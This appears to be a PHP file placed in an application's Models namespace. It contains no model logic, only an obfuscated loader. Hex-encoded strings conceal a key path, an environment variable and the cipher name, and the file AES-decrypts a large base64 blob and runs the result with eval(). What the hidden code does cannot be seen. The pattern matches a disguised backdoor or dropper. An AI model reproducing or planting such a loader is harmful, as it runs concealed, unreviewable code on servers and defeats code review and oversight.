<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('i/Cpmru+vG1y8O3xqOqEuQ==');

$c=base64_decode(

'HxfO6GcpNgmroAk+/AcIjDXAOUEVK9LvtRSS3enJEpVaysxrV6Kv6qzQiRXcblzQLrt5WvOl1JuW' .
'JWSqr2vPQU/74U1+1aFQYIvOHdJ7dnXUmtERGAWxQxzSiI4V8QLO1Q4JXaUc1fsQ1+KC2m1zID5T' .
'v0hOFVcCFWqcuQTo2FW36Xtu4gDUcT2cBA0Fo9+2nab/8Vsb2b+dOMRjFPZjzLOUoI+W2lJqJING' .
'iAgXhn2F5djwgMqFDPz2W/qn7NnrxSKO13g901EpmPU2TA+eZDSapze5IyfVVoLsABtbezeCRzYZ' .
'OYCd5EUww5wEd323pRYljUMu6zDUgd914tfaF8uuFPfC2sBF0Q9mftKrIp2Dotf6DkM3ZZzq7ENw' .
'fBUUV3eaLF6SCWfCqELflCX1nO8RuGUho4l/m4vWCbvKcAqDGdR4Z00VMPWW1q/UUs1OURmFtkR4' .
'FkarV+JGYl4geE14XM5D+D6iP4+J8cvpkhCQMfs478ZswTlOH1s2zsbrZ6EPOgrJI9TONY5d9qm1' .
've3xHOPmZI/zApzpPuitfLo6ic/lrLEqVXgpEwOsWm8cJ4lCb0MmUEW9pR37fm1RjOCDXtovqIZ2' .
'g49PAEaeiAjlj/jUVjWyud/lge37sZ9gv2HjQYIhuEepeB6n1H1Ds4sECLMMEOG+nYq58/1rHbFM' .
'JBiXWBnMRCsBzuLIulBUmZtiUMnzYtGQgUl6Bh+JgPCNGZEi4Y6GMQFNdWP7Lr4jY/suwEOjG66W' .
'uCyQKQK5TUH7SDHovl3TpqHCmI3OSviIex9SfmphtVPSI/EBPhaYghyOwxrfOtKjcvSyb56Q8ovd' .
'M43yWAxAie8Ynrjlo/EmdSCLmSuFdrv2r+k2GfDVHw2DRE8IIXEGvXpYW/nHOwXFMtzuXraJS+UR' .
'Jtcf/V80aG1ZrlsnX45rjRwiKsyn8yrwOOK+E/YTnD2S+JCusWBcuYc/P1NDuQzrAIpfGZsRjdP8' .
'iJB1JqPgTssztiYeBTivv7zWytxrhSM2FIVhdQchc7360qcNdYvq8yVLZvde09l7wSzbU/sYszrs' .
'9rWetBi13QtsRxwyWEJzA/cNJaakW0WoJAEHNempPHoanWDfP28ggA5U+uH9Khz635Do1Lh0AadA' .
'njd4z0lfeAA5VfXHNUgqNQ0JnvmlrOKkWOksIUOKKQN8OEPZr+6+GwS/c9tkUj0Nn7xqTw89CG9q'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

